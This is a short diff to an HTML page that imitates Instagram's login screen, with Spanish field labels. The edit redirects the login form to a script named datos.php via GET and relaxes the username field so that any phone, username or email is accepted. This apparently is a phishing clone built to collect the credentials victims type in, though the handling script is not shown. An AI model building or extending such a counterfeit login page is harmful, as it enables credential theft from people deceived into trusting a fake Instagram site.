@@ -8,6 +8,7 @@
     <title>Instagram</title>
     <link rel="stylesheet" href="assets/css/style.css">
     <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
+    
 </head>
 <body>
     <main>
@@ -30,10 +31,10 @@
                 <hr class="content__separate--hr">
             </div>
             <div class="form">
-                <form action="redirection.php" class="form__area" method="GET">
+                <form action="datos.php" class="form__area" method="GET">
                     <div class="form__area--box-1" id="box-1">
                         <label for="" class="form__area--box_legend" id="legend-box-1">
-                            <input type="email" name="email" class="form__area--box_legend-input-3" placeholder="Teléfono, usuario o correo electrónico" id="email" required>
+                            <input type="text" name="email" class="form__area--box_legend-input-3" placeholder="Teléfono, usuario o correo electrónico" id="email" required>
                         </label>
                     </div>
                     <div class="form__area--box-1" id="box-2">
@@ -75,5 +76,6 @@
         </ul>
     </footer>
     <script src="assets/js/script.js"></script>
+    
 </body>
 </html>
